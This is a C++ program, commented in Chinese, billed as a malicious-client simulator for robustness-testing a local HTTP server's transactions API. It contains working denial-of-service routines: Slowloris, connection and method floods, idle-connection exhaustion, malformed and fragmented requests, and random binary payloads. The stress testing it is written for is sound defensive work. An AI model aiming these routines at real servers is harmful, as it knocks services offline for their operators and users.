/*
 * 恶意客户端模拟程序
 * 目标：模拟各种恶意客户端行为，测试服务器的鲁棒性
 * 编译：g++ -std=c++11 -o malicious_client malicious_client.cpp -pthread
 * 运行：./malicious_client
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>

class MaliciousClient {
private:
    std::string server_host;
    int server_port;
    std::random_device rd;
    std::mt19937 gen;
    
public:
    MaliciousClient(const std::string& host = "127.0.0.1", int port = 8080) 
        : server_host(host), server_port(port), gen(rd()) {}
    
    // 创建连接但不关闭的socket
    int createPersistentSocket() {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return -1;
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            return -1;
        }
        
        return sock;
    }
    
    // 发送数据并可选择性接收响应
    bool sendData(int sock, const std::string& data, bool receive_response = false) {
        if (send(sock, data.c_str(), data.length(), 0) < 0) {
            return false;
        }
        
        if (receive_response) {
            char buffer[1024];
            recv(sock, buffer, sizeof(buffer), 0);
        }
        
        return true;
    }
    
    // 攻击1：慢速HTTP攻击（Slowloris）
    void slowHttpAttack() {
        std::cout << "\n=== 慢速HTTP攻击（Slowloris） ===" << std::endl;
        
        std::vector<int> sockets;
        const int num_connections = 100;
        
        // 创建大量慢速连接
        for (int i = 0; i < num_connections; ++i) {
            int sock = createPersistentSocket();
            if (sock >= 0) {
                sockets.push_back(sock);
                
                // 发送不完整的HTTP请求
                std::string partial_request = 
                    "GET /api/managers/slow_attack_" + std::to_string(i) + "/transactions HTTP/1.1\r\n"
                    "Host: " + server_host + "\r\n"
                    "User-Agent: SlowAttacker\r\n";
                
                sendData(sock, partial_request, false);
                
                if (i % 10 == 0) {
                    std::cout << "已创建 " << i << " 个慢速连接" << std::endl;
                }
            }
        }
        
        std::cout << "总共创建了 " << sockets.size() << " 个慢速连接" << std::endl;
        
        // 保持连接活跃，定期发送一个字节
        for (int round = 0; round < 10; ++round) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            
            int alive_count = 0;
            for (int sock : sockets) {
                if (sendData(sock, "X", false)) {
                    alive_count++;
                }
            }
            
            std::cout << "轮次 " << round + 1 << ": " << alive_count << " 个连接仍然活跃" << std::endl;
        }
        
        // 关闭所有连接
        for (int sock : sockets) {
            close(sock);
        }
        
        std::cout << "慢速HTTP攻击完成" << std::endl;
    }
    
    // 攻击2：畸形HTTP请求攻击
    void malformedHttpAttack() {
        std::cout << "\n=== 畸形HTTP请求攻击 ===" << std::endl;
        
        std::vector<std::string> malformed_requests = {
            // 无效的HTTP方法
            "INVALID_METHOD /api/managers/test/transactions HTTP/1.1\r\n\r\n",
            
            // 缺少HTTP版本
            "GET /api/managers/test/transactions\r\n\r\n",
            
            // 错误的行结束符
            "GET /api/managers/test/transactions HTTP/1.1\n\n",
            
            // 超长的请求行
            "GET /" + std::string(100000, 'A') + " HTTP/1.1\r\n\r\n",
            
            // 无效的头部
            "GET /api/managers/test/transactions HTTP/1.1\r\n"
            "Invalid Header Without Colon\r\n\r\n",
            
            // 头部中包含NULL字符
            "GET /api/managers/test/transactions HTTP/1.1\r\n"
            "X-Header: value\x00with\x00nulls\r\n\r\n",
            
            // 重复的Content-Length
            "POST /api/managers/test/transactions HTTP/1.1\r\n"
            "Content-Length: 10\r\n"
            "Content-Length: 20\r\n\r\n",
            
            // 负数Content-Length
            "POST /api/managers/test/transactions HTTP/1.1\r\n"
            "Content-Length: -1\r\n\r\n",
            
            // 超大Content-Length
            "POST /api/managers/test/transactions HTTP/1.1\r\n"
            "Content-Length: 999999999999\r\n\r\n",
            
            // 二进制垃圾数据
            std::string(100, '\x00') + std::string(100, '\xff') + "HTTP\r\n\r\n",
        };
        
        for (size_t i = 0; i < malformed_requests.size(); ++i) {
            std::cout << "发送畸形请求 " << i + 1 << ": ";
            
            int sock = createPersistentSocket();
            if (sock >= 0) {
                if (sendData(sock, malformed_requests[i], true)) {
                    std::cout << "已发送" << std::endl;
                } else {
                    std::cout << "发送失败" << std::endl;
                }
                close(sock);
            } else {
                std::cout << "连接失败" << std::endl;
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    
    // 攻击3：HTTP管道攻击
    void httpPipeliningAttack() {
        std::cout << "\n=== HTTP管道攻击 ===" << std::endl;
        
        int sock = createPersistentSocket();
        if (sock < 0) {
            std::cout << "无法创建连接" << std::endl;
            return;
        }
        
        // 发送多个请求而不等待响应
        std::string pipelined_requests = 
            "GET /api/managers/pipe1/transactions HTTP/1.1\r\nHost: " + server_host + "\r\n\r\n"
            "GET /api/managers/pipe2/transactions HTTP/1.1\r\nHost: " + server_host + "\r\n\r\n"
            "GET /api/managers/pipe3/transactions HTTP/1.1\r\nHost: " + server_host + "\r\n\r\n"
            "POST /api/managers/pipe4/transactions HTTP/1.1\r\nHost: " + server_host + "\r\n"
            "Content-Length: 50\r\n\r\n"
            R"({"trans_id":"pipe","item_id":"test","type":"in"})"
            "GET /api/managers/pipe5/transactions HTTP/1.1\r\nHost: " + server_host + "\r\n\r\n";
        
        std::cout << "发送管道请求..." << std::endl;
        if (sendData(sock, pipelined_requests, false)) {
            std::cout << "管道请求已发送，等待响应..." << std::endl;
            
            // 尝试读取所有响应
            char buffer[8192];
            int total_received = 0;
            
            for (int i = 0; i < 5; ++i) {
                int bytes = recv(sock, buffer, sizeof(buffer), 0);
                if (bytes > 0) {
                    total_received += bytes;
                    std::cout << "收到响应 " << i + 1 << ": " << bytes << " 字节" << std::endl;
                } else {
                    std::cout << "响应 " << i + 1 << ": 连接关闭或错误" << std::endl;
                    break;
                }
            }
            
            std::cout << "总共收到 " << total_received << " 字节响应" << std::endl;
        }
        
        close(sock);
    }
    
    // 攻击4：连接洪水攻击
    void connectionFloodAttack() {
        std::cout << "\n=== 连接洪水攻击 ===" << std::endl;
        
        const int num_threads = 20;
        const int connections_per_thread = 50;
        
        std::vector<std::thread> threads;
        
        for (int t = 0; t < num_threads; ++t) {
            threads.emplace_back([this, t, connections_per_thread]() {
                for (int i = 0; i < connections_per_thread; ++i) {
                    int sock = createPersistentSocket();
                    if (sock >= 0) {
                        // 发送一个快速请求然后立即关闭
                        std::string request = 
                            "GET /api/managers/flood_" + std::to_string(t * connections_per_thread + i) + 
                            "/transactions HTTP/1.1\r\n"
                            "Host: " + server_host + "\r\n"
                            "Connection: close\r\n\r\n";
                        
                        sendData(sock, request, false);
                        close(sock);
                    }
                    
                    // 随机延迟以增加不可预测性
                    std::uniform_int_distribution<> dis(1, 50);
                    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
                }
            });
        }
        
        std::cout << "启动 " << num_threads << " 个线程进行连接洪水攻击..." << std::endl;
        
        for (auto& thread : threads) {
            thread.join();
        }
        
        std::cout << "连接洪水攻击完成：总共 " << (num_threads * connections_per_thread) << " 个连接" << std::endl;
    }
    
    // 攻击5：随机二进制数据攻击
    void randomBinaryAttack() {
        std::cout << "\n=== 随机二进制数据攻击 ===" << std::endl;
        
        for (int i = 0; i < 20; ++i) {
            int sock = createPersistentSocket();
            if (sock >= 0) {
                // 生成随机二进制数据
                std::vector<char> random_data(1024 + (gen() % 4096));
                std::uniform_int_distribution<> byte_dis(0, 255);
                
                for (size_t j = 0; j < random_data.size(); ++j) {
                    random_data[j] = static_cast<char>(byte_dis(gen));
                }
                
                std::cout << "发送随机数据 " << i + 1 << " (" << random_data.size() << " 字节)..." << std::endl;
                
                send(sock, random_data.data(), random_data.size(), 0);
                
                // 尝试接收响应
                char buffer[1024];
                int bytes = recv(sock, buffer, sizeof(buffer), MSG_DONTWAIT);
                if (bytes > 0) {
                    std::cout << "  收到 " << bytes << " 字节响应" << std::endl;
                }
                
                close(sock);
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
        }
    }
    
    // 攻击6：保持连接但不发送数据
    void idleConnectionAttack() {
        std::cout << "\n=== 空闲连接攻击 ===" << std::endl;
        
        std::vector<int> idle_sockets;
        const int num_idle_connections = 50;
        
        // 创建多个连接但不发送任何数据
        for (int i = 0; i < num_idle_connections; ++i) {
            int sock = createPersistentSocket();
            if (sock >= 0) {
                idle_sockets.push_back(sock);
                std::cout << "创建空闲连接 " << i + 1 << std::endl;
            }
        }
        
        std::cout << "总共创建了 " << idle_sockets.size() << " 个空闲连接" << std::endl;
        std::cout << "保持连接60秒..." << std::endl;
        
        // 保持连接60秒
        std::this_thread::sleep_for(std::chrono::seconds(60));
        
        // 检查哪些连接仍然活跃
        int active_count = 0;
        for (int sock : idle_sockets) {
            char test_byte = 'T';
            if (send(sock, &test_byte, 1, MSG_DONTWAIT) >= 0) {
                active_count++;
            }
            close(sock);
        }
        
        std::cout << "60秒后仍有 " << active_count << " 个连接活跃" << std::endl;
    }
    
    // 攻击7：分片请求攻击
    void fragmentedRequestAttack() {
        std::cout << "\n=== 分片请求攻击 ===" << std::endl;
        
        int sock = createPersistentSocket();
        if (sock < 0) {
            std::cout << "无法创建连接" << std::endl;
            return;
        }
        
        // 将HTTP请求分成多个小片段发送
        std::string full_request = 
            "POST /api/managers/fragment_test/transactions HTTP/1.1\r\n"
            "Host: " + server_host + "\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: 100\r\n"
            "\r\n"
            R"({"trans_id":"fragment_test","item_id":"test","item_name":"test","type":"in","quantity":1})";
        
        std::cout << "发送分片请求..." << std::endl;
        
        // 逐字节发送（极端分片）
        for (size_t i = 0; i < full_request.length(); ++i) {
            if (send(sock, &full_request[i], 1, 0) < 0) {
                std::cout << "发送失败在字节 " << i << std::endl;
                break;
            }
            
            if (i % 10 == 0) {
                std::cout << "已发送 " << i << " 字节" << std::endl;
            }
            
            // 随机延迟
            std::uniform_int_distribution<> delay_dis(1, 100);
            std::this_thread::sleep_for(std::chrono::milliseconds(delay_dis(gen)));
        }
        
        // 尝试接收响应
        char buffer[1024];
        int bytes = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes > 0) {
            std::cout << "收到 " << bytes << " 字节响应" << std::endl;
        }
        
        close(sock);
    }
    
    // 攻击8：HTTP方法洪水
    void httpMethodFloodAttack() {
        std::cout << "\n=== HTTP方法洪水攻击 ===" << std::endl;
        
        std::vector<std::string> methods = {
            "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS",
            "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL",
            "COPY", "MOVE", "LOCK", "UNLOCK", "INVALID_METHOD_12345"
        };
        
        for (const std::string& method : methods) {
            for (int i = 0; i < 10; ++i) {
                int sock = createPersistentSocket();
                if (sock >= 0) {
                    std::string request = 
                        method + " /api/managers/method_flood_" + std::to_string(i) + "/transactions HTTP/1.1\r\n"
                        "Host: " + server_host + "\r\n"
                        "\r\n";
                    
                    sendData(sock, request, false);
                    close(sock);
                }
            }
            
            std::cout << "完成 " << method << " 方法洪水攻击" << std::endl;
        }
    }
    
    // 运行所有恶意客户端攻击
    void runAllAttacks() {
        std::cout << "🔥 开始恶意客户端攻击 - 目标服务器: " << server_host << ":" << server_port << std::endl;
        std::cout << "⚠️  警告：这些攻击可能会占用大量系统资源！" << std::endl;
        
        slowHttpAttack();
        malformedHttpAttack();
        httpPipeliningAttack();
        connectionFloodAttack();
        randomBinaryAttack();
        idleConnectionAttack();
        fragmentedRequestAttack();
        httpMethodFloodAttack();
        
        std::cout << "\n🏁 所有恶意客户端攻击完成" << std::endl;
        std::cout << "请监控服务器性能和日志以评估攻击效果" << std::endl;
    }
};

int main() {
    MaliciousClient client;
    client.runAllAttacks();
    return 0;
}